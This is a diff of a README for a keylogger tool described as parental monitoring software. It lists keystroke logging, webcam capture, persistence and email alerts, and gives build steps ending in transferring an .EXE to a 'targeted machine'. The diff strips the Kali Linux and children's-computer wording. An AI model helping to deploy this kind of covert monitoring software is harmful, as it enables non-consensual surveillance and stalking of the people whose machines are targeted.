@@ -9,9 +9,9 @@ Features:-
 - Webcam capture in .png
 - Persistence function for track children's daily activities on the Internet.
 
-# Need to have a Kali Linux to install this software.
+# Need to have a Linux OS to install this software.
 
-# Step for Kali Linux before install the software (The user computer aka parent's computer)
+# To generate the software in Linux OS
 
 1. Clone the repository
 - $ git clone https://github.com/winahannah/logKEY.git
@@ -24,7 +24,7 @@ Features:-
 
 4. Transfer the .EXE file from the target/folder to the targeted machine.
 
-# Step for Windows (The target computer aka children's computer)
+# To run the software in Windows OS
 
 - Install the latest Java JRE 8 from Oracle, https://www.java.com/en/download/
 
@@ -32,7 +32,7 @@ Features:-
 
 - Email and Notification will be sent to the user's email when an inappropriate word has been detected by the keylogger.
 
-# To stop or uninstall the software in the target computer
+# Uninstallation of the software
 
 - Go to task manager
 
